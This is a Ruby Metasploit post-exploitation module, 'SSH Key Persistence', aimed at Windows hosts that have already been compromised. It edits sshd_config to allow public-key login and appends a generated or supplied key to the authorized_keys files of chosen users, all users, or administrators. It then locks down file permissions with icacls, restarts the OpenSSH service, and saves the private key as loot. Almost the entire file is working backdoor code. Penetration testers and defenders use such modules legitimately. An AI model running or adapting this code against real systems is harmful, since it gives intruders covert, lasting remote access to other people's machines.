##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sshkey'

class MetasploitModule < Msf::Post
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'SSH Key Persistence',
        'Description'    => %q{
          This module will add an SSH key to a specified user (or all), to allow
          remote login via SSH at any time.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Dean Welch <dean_welch[at]rapid7.com>'
          ],
        'Platform'       => [ 'windows' ],
        'SessionTypes'   => [ 'meterpreter', 'shell' ]
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),
        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),
        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', 'C:\ProgramData\ssh\sshd_config' ]),
        OptString.new('ADMIN_KEY_FILE', [true, 'Admin key file', 'C:\ProgramData\ssh\administrators_authorized_keys' ]),
        OptBool.new('EDIT_CONFIG', [true, 'Edit ssh config to allow public key authentication', false ]),
        OptBool.new('ADMIN', [true, 'Add keys for administrator accounts', false ]),
        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])
      ], self.class
    )
  end

  def run

    sep = separator

    sshd_config = read_file(datastore['SSHD_CONFIG'])

    print_status('Checking SSH Permissions')
    unless pub_key_auth_allowed?(sshd_config)
      enable_pub_key_auth(sshd_config) if datastore['EDIT_CONFIG']
    end

    auth_key_file = auth_key_file_name(sshd_config)

    print_status("Authorized Keys File: #{auth_key_file}")

    auth_key_folder = auth_key_file.split('/')[0...-1].join(sep)
    auth_key_file = auth_key_file.split('/')[-1]

    paths = []
    if datastore['USERNAME']
      grab_user_profiles.each { |profile|
        paths << "#{profile["ProfileDir"]}#{sep}#{auth_key_folder}" if profile['UserName'] == datastore['USERNAME']
      }
    end

    if datastore['ADMIN']    # SSH keys for admin accounts are stored in a separate location
      admin_auth_key_folder = datastore['ADMIN_KEY_FILE'].split(sep)[0...-1].join(sep)
      admin_auth_key_file = datastore['ADMIN_KEY_FILE'].split(sep)[-1]

      print_status("Admin Authorized Keys File: #{admin_auth_key_file}")

      write_key([admin_auth_key_folder], admin_auth_key_file, sep)
    end

    if !datastore['USERNAME'] and !datastore['ADMIN']
      grab_user_profiles.each { |profile|
        paths << "#{profile['ProfileDir']}#{sep}#{auth_key_folder}"
      }
    end

    if datastore['CREATESSHFOLDER'] == true
      create_ssh_folder(paths)
    end

    paths = paths.select { |d| directory?(d) }
    unless paths.empty?
      write_key(paths, auth_key_file, sep)
    end

    restart_openssh
  end

  def enable_pub_key_auth(sshd_config)
    sshd_config = sshd_config.sub(/^.*(PubkeyAuthentication).*$/, 'PubkeyAuthentication yes')
    write_file(datastore['SSHD_CONFIG'], sshd_config)
  end

  def pub_key_auth_allowed?(sshd_config)
    /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
    if pub_key && pub_key == 'no'
      print_error('Pubkey Authentication disabled')
    elsif pub_key
      vprint_good("Pubkey set to #{pub_key}")
    end
  end

  def auth_key_file_name(sshd_config)
    /^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%\/\.]+)/ =~ sshd_config
    if auth_key_file
      auth_key_file = auth_key_file.gsub('%h', '')
      auth_key_file = auth_key_file.gsub('%%', '%')
      if auth_key_file.start_with? '/'
        auth_key_file = auth_key_file[1..-1]
      end
    else
      auth_key_file = '.ssh/authorized_keys'
    end
    auth_key_file
  end

  def create_ssh_folder(paths)
    vprint_status("Attempting to create ssh folders that don't exist")
    paths.each do |p|
      unless directory?(p)
        print_status("Creating #{p} folder")
        session.fs.dir.mkdir(p)
      end
    end
  end

  def restart_openssh
    cmd_exec('net stop "OpenSSH SSH Server"')
    cmd_exec('net start "OpenSSH SSH Server"')
  end

  def set_pub_key_file_permissions(file)
    cmd_exec("icacls #{file} /inheritance:r")
    cmd_exec("icacls #{file} /grant SYSTEM:(F)")
    cmd_exec("icacls #{file} /grant BUILTIN\\Administrators:(F)")
  end

  def separator
    if session.type == "meterpreter"
      sep = session.fs.file.separator
    else
      # Guess, but it's probably right
      sep = '\\'
    end
    sep
  end

  def write_key(paths, auth_key_file, sep)
    if datastore['PUBKEY'].nil?
      key = SSHKey.generate
      our_pub_key = key.ssh_public_key
      loot_path = store_loot("id_rsa", "text/plain", session, key.private_key, "ssh_id_rsa", "OpenSSH Private Key File")
      print_good("Storing new private key as #{loot_path}")
    else
      our_pub_key = ::File.read(datastore['PUBKEY'])
    end
    paths.each do |path|
      path.chomp!
      authorized_keys = "#{path}#{sep}#{auth_key_file}"
      print_status("Adding key to #{authorized_keys}")
      append_file(authorized_keys, "\n#{our_pub_key}")
      print_good("Key Added")
      set_pub_key_file_permissions(authorized_keys)
      if datastore['PUBKEY'].nil?
        path_array = path.split(sep)
        path_array.pop
        user = path_array.pop
        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: refname,
          private_type: :ssh_key,
          private_data: key.private_key.to_s,
          username: user,
          workspace_id: myworkspace_id
        }

        create_credential(credential_data)
      end
    end
  end
end
